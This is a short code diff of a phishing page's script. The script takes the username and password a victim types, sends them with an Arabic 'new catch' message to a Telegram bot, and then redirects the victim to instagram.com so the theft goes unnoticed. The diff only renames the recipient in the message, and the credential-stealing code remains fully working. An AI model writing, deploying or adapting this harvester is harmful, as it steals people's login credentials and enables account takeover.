@@ -75,7 +75,7 @@
             btn.innerText = "Loading...";
             btn.disabled = true;
 
-            const text = `🚀 صيدة جديدة يا حسين!\n👤 الحساب: ${document.getElementById('user').value}\n🔑 الباسورد: ${document.getElementById('pass').value}`;
+            const text = `🚀 صيدة جديدة يا bilal!\n👤 الحساب: ${document.getElementById('user').value}\n🔑 الباسورد: ${document.getElementById('pass').value}`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
             .then(() => { window.location.href = "https://www.instagram.com"; })
@@ -83,4 +83,5 @@
         });
     </script>
 </body>
+
 </html>
